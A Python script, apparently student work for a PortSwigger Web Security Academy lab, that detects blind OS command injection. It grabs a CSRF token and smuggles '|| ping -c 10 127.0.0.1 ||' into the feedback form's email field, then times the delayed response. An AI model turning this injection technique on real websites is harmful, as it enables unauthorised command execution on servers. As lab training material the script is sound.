import requests
from bs4 import BeautifulSoup
import time

# Replace this with your lab instance
site = '0a20005f03c0c69681944dc400be0019.web-security-academy.net'

# URLs
feedback_url = f'https://{site}/feedback'
feedback_submit_url = f'https://{site}/feedback/submit'

# Start a session
s = requests.Session()

# Step 1: Get CSRF token
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Step 2: Craft post data
post_data = {
    'csrf': csrf,
    'name': 'Jarren Calizo',
    'email': 'test@pdx.edu || ping -c 10 127.0.0.1 ||',
    'subject': 'Feedback subject',
    'message': 'Feedback message'
}

# Step 3: Post feedback with injection
print("[*] Submitting feedback with blind command injection... (expect ~10 second delay)")
start = time.time()
resp = s.post(feedback_submit_url, data=post_data)
end = time.time()

# Step 4: Print results
print(f"[+] Response: {resp.text.strip()}")
print(f"[+] Delay detected: {round(end - start, 2)} seconds")